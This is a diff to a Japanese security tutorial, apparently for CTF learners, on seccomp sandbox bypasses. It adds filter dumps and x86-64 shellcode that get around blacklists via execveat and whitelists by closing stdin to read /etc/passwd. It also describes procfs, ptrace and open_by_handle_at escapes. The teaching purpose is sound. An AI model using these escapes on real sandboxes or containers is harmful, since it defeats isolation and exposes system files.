@@ -98,7 +98,20 @@ int main() {
   return 0;
 }
 ```
-すると、次のように強制終了します。
+まずはseccomp-toolsでルールを確認します。
+```
+$ seccomp-tools dump ./a.out 
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0001: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0004
+ 0002: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0004
+ 0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0004: 0x06 0x00 0x00 0x00000000  return KILL
+```
+書いたルールと一致していることが分かります。dumpコマンドはseccompルールがprctlで適用される瞬間をフックしているので、該当箇所までプログラムを動かさないとダンプは表示されません。
+
+さて、プログラムを実行すると強制終了するはずです。
 ```
 $ ./a.out 
 間違ったシステムコール (コアダンプ)
@@ -144,25 +157,184 @@ DoSなどの悪さを禁止するなら、他にも
 ## ブラックリストの不備
 ここからはseccompの回避方法について説明します。まず、ブラックリスト方式を利用した際の不備を悪用する方法を紹介します。
 
+ここからはたくさんのseccompルールが登場します。毎回書きたくない方は[LU-seccomp]()をダウンロードしてください。以下のように使えます。
+```sh
+$ make 01-filter    # filter.binを生成
+$ ./lu-seccomp
+<ここにシェルコードを入力>
+$ python test.py    # ptrlibでシェルコードを実行
+```
+
 ### openatとexecveat
 まず典型的なミスは、`execve`や`open`だけ禁止して、`execveat`や`openat`などの同等の機能を備えたマイナーなシステムコールを禁止し忘れるパターンです。
+次のルール（`01-filter`）を見てみましょう。
+```
+$ make 01-filter
+$ seccomp-tools dump ./lu-seccomp
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x04 0xc000003e  if (A != ARCH_X86_64) goto 0006
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x02 0x00 0x40000000  if (A >= 0x40000000) goto 0006
+ 0004: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0006
+ 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0006: 0x06 0x00 0x00 0x00000000  return KILL
+```
+`execve`を禁止していますが、`execveat`が許可されています。したがって、次のようなコードで任意コマンド実行できます。
+```asm
+xor r10d, r10d
+xor eax, eax
+push rax
+lea rsi, [rel argv1]
+push rsi
+lea rsi, [rel argv0]
+push rsi
+mov rdx, rsp
+mov edi, -100
+mov eax, {syscall.x64.execveat}
+syscall
 
-
+argv0: db "/bin/ls", 0
+argv1: db "-lha", 0
+```
+なお、**seccompルールは子プロセスにも引き継がれる**ため、`/bin/sh`のように内部で`execve`を使うプログラムは起動しても意味がありません。
 
 ### creatとprocfs
+次のルール（`02-filter`）を見てみましょう。
+```
+$ make 02-filter
+$ seccomp-tools dump ./lu-seccomp 
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x04 0x00 0x40000000  if (A >= 0x40000000) goto 0008
+ 0004: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0008
+ 0005: 0x15 0x02 0x00 0x00000101  if (A == openat) goto 0008
+ 0006: 0x15 0x01 0x00 0x000001b5  if (A == 0x1b5) goto 0008
+ 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0008: 0x06 0x00 0x00 0x00000000  return KILL
+```
+seccomp-toolsは新しいシステムコールをうまく表示できないことがありますが、line 6は`openat2`を禁止しています。`creat`が禁止されていないので、これを使ってファイルが読めるでしょうか。
+```
+mov esi, 0400
+lea rdi, [rel pathname]
+mov eax, {syscall.x64.creat}
+syscall
+test rax, rax
+jl error
 
+mov edx, 0x100
+mov rsi, rsp
+mov edi, eax
+mov eax, {syscall.x64.read}
+syscall
 
-### ptrace
+mov edx, 0x100
+mov rsi, rsp
+mov edi, 1
+mov eax, {syscall.x64.write}
+syscall
+hlt
 
+error:
+mov edx, 17
+lea rsi, [rel s_warn]
+mov edi, 1
+mov eax, {syscall.x64.write}
+syscall
 
+s_warn: db "Cannot open file", 0x0a, 0
+pathname: db "/etc/issue", 0
+```
+残念ながら通常ファイルを読むことはできません。`creat`は新規で空ファイルを生成するため、ファイルの内容が空になってしまいます。上の例では書き換え権限がないファイルを開こうとするためエラーになります。（書き換え可能な一般ファイルを指定すると中身が空になるので注意してください。）
 
+しかし、`fork`型プロセスで親プロセスと子プロセスが通信するタイプのシステムで子プロセスのみにseccompがかかっている場合、親プロセスの`/proc/<pid>/mem`を開くことができます。この場合、seccompがかかっていない親プロセスのメモリを書き換えられるため、サンドボックス回避に成功します。
+このように、`fork`型のシステムでは`open`系のシステムコールを使い、procfs経由で親プロセスを操作できるため注意が必要です。
 
+また、プログラムが`CAP_DAC_READ_SEARCH`権限を持っている場合、同様にファイルをオープンできる`open_by_handle_at`システムコールも禁止しなくてはなりません。
 
-### process\_vm\_readv, process\_vm\_writev
+### ptrace, process\_vm\_readv, process\_vm\_writev
+procfsの例と同様に、`fork`親プロセスのメモリやレジスタを操作できるシステムコールがいくつかあります。
 
+`ptrace`はプロセスを操作する代表的なシステムコールです。メモリの読み書きだけでなくレジスタの操作やステップ実行などプロセスに対するあらゆる操作が可能です。`ptrace`が禁止されていない場合、通常`fork`型では親プロセスを操作できます。
+同様に、`process_vm_readv`, `process_vm_writev`というシステムコールがあります。これらは名前の通りプロセスのメモリを読み書きするためのシステムコールで、`ptrace`と同様に禁止を忘れると、`fork`型の場合親プロセスのメモリを操作できます。
 
-### open\_by\_handle\_at, name\_to\_handle\_at
+以上は直接的にプロセスのメモリを操作するシステムコールですが、他のプロセスに影響を与えるシステムコールは他にも多数あります。
+代表的なものは`kill`, `prlimit64`などで、いずれも直接exploitには活用できませんが、状況によってはサンドボックス回避に役立ちます。pidを引数に取るようなシステムコールには注意しましょう。
 
+### コンテナエスケープ
+どうしてもブラックリストルールを使う必要がある例として、dockerのようなコンテナが挙げられます。さまざまなユーザープログラムが動くコンテナでは、特定のシステムコールだけを利用可能にすることは非現実的です。
+
+root権限を明け渡す可能性が高いコンテナでは、より多くのシステムコールを禁止する必要があります。
+例えば`ptrace`を許可してしまうとルートプロセスを乗っ取られてしまったり、`open_by_handle_at`が使えるとコンテナの外側のファイルを操作できてしまったり[^1]というコンテナエスケープの脆弱性に繋がります。
+
+コンテナが禁止すべきシステムコールは以下のDockerドキュメントを参考にすると良いです。
+
+https://docs.docker.com/engine/security/seccomp/
+
+[^1]: Dockerで該当脆弱性があり、Shockerという名前で有名です。
+
+## ホワイトボックスの不備
+ホワイトボックスルールでも、当然これまで述べてきたような悪用されやすいシステムコールが許可されていれば問題になります。
+それ以外にも、引数の検証で安全性を担保しようとすると、ミスが発生しやすいです。
+
+### 引数の確認不備
+3番目のルールを確認してみましょう。
+```
+$ make 03-filter
+$ seccomp-tools dump ./lu-seccomp 
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x04 0x00 0x40000000  if (A >= 0x40000000) goto 0008
+ 0004: 0x15 0x0a 0x00 0x00000002  if (A == open) goto 0015
+ 0005: 0x15 0x09 0x00 0x00000003  if (A == close) goto 0015
+ 0006: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0009
+ 0007: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0012
+ 0008: 0x06 0x00 0x00 0x00000000  return KILL
+ 0009: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)
+ 0010: 0x15 0x04 0x00 0x00000000  if (A == 0x0) goto 0015
+ 0011: 0x06 0x00 0x00 0x00000000  return KILL
+ 0012: 0x20 0x00 0x00 0x00000010  A = fd # write(fd, buf, count)
+ 0013: 0x15 0x01 0x00 0x00000001  if (A == 0x1) goto 0015
+ 0014: 0x06 0x00 0x00 0x00000000  return KILL
+ 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+```
+このルールは`open`, `read`, `write`, `close`のみを許可するホワイトボックスルールです。任意ファイルを読み書きできないように、`read`, `write`の引数を確認し、それぞれstdin(=0), stdout(=1)への読み書きしか許可していません。
+
+安全に見えるかもしれませんが、次のようなコードで回避できます。
+```asm
+xor edi, edi
+mov eax, {syscall.x64.close}
+syscall
+
+xor esi, esi
+lea rdi, [rel pathname]
+mov eax, {syscall.x64.open}
+syscall
+
+mov edx, 0x1000
+mov rsi, rsp
+mov edi, eax
+mov eax, {syscall.x64.read}
+syscall
+
+mov edx, eax
+mov rsi, rsp
+mov edi, 1
+mov eax, {syscall.x64.write}
+syscall
+
+pathname: db "/etc/passwd", 0
+```
+このシェルコードでは、最初に`close`でstdinを閉じています。したがって、次の`open`で`/etc/passwd`を開いたときにファイルディスクリプタとして0番が選ばれ、`read`の引数チェックを回避できます。
+
+stdinとstdoutの`close`を禁止するルールを書けば安全になります。
 
 ## サイドチャネル攻撃
 メモリ上の情報漏洩が目的で、コマンド実行などが不要な場合もあります。このような場合はシステムコールを利用せずに情報漏洩が可能かもしれません。
@@ -173,8 +345,19 @@ DoSなどの悪さを禁止するなら、他にも
 ### 処理時間の計測
 
 
+
+## アーキテクチャとシステムコール番号の検証不備
+適切にホワイトリスト・ブラックリスト方式を実装していても問題が起きるケースを紹介します。
+
+### アーキテクチャの検証不備
+
+### x32 ABIの利用
+
+
+
 ## その他の回避手法
 
+### カーネルやライブラリの欠陥の利用
 
 ### 他プロセスの悪用
 
@@ -183,7 +366,9 @@ DoSなどの悪さを禁止するなら、他にも
 
 #### prlimit64
 
+----
 
+<div class="column" title="例題１">
+</div>
 
-### カーネルやライブラリの欠陥の利用
-
+[☞ 例題の解答](seccomp-answer.html)
